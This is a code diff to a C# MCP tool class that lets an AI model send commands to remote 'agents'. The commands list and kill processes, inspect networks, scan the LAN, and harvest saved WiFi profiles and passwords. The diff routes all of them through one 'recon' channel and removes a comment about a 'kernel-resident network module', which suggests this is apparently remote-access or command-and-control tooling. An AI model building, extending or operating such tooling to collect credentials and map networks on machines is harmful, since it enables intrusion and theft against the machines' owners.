@@ -14,7 +14,7 @@ public sealed class SystemTools
         AgentService agents,
         [Description("Target agent ID")] string agentId)
     {
-        return await McpUtils.RelayOrError(relay, agents, agentId, "system.processes", null, TimeSpan.FromSeconds(30));
+        return await McpUtils.RelayOrError(relay, agents, agentId, "recon", new { op = "processes" }, TimeSpan.FromSeconds(30));
     }
 
     [McpServerTool, Description("Kill a process by PID on an agent")]
@@ -34,7 +34,7 @@ public sealed class SystemTools
         AgentService agents,
         [Description("Target agent ID")] string agentId)
     {
-        return await McpUtils.RelayOrError(relay, agents, agentId, "system.network", null, TimeSpan.FromSeconds(30));
+        return await McpUtils.RelayOrError(relay, agents, agentId, "recon", new { op = "network" }, TimeSpan.FromSeconds(30));
     }
 
     [McpServerTool, Description("Scan saved WiFi profiles and passwords on an agent")]
@@ -43,8 +43,7 @@ public sealed class SystemTools
         AgentService agents,
         [Description("Target agent ID")] string agentId)
     {
-        // WiFi profiles/passwords are served by the kernel-resident network module.
-        return await McpUtils.RelayOrError(relay, agents, agentId, "system.network.wifi", null, TimeSpan.FromSeconds(30));
+        return await McpUtils.RelayOrError(relay, agents, agentId, "recon", new { op = "network.wifi" }, TimeSpan.FromSeconds(30));
     }
 
     [McpServerTool, Description("Scan the LAN for nearby devices via ARP/ICMP")]
@@ -53,6 +52,6 @@ public sealed class SystemTools
         AgentService agents,
         [Description("Target agent ID")] string agentId)
     {
-        return await McpUtils.RelayOrError(relay, agents, agentId, "system.lanscan", null, TimeSpan.FromSeconds(60));
+        return await McpUtils.RelayOrError(relay, agents, agentId, "recon", new { op = "lanscan" }, TimeSpan.FromSeconds(60));
     }
 }
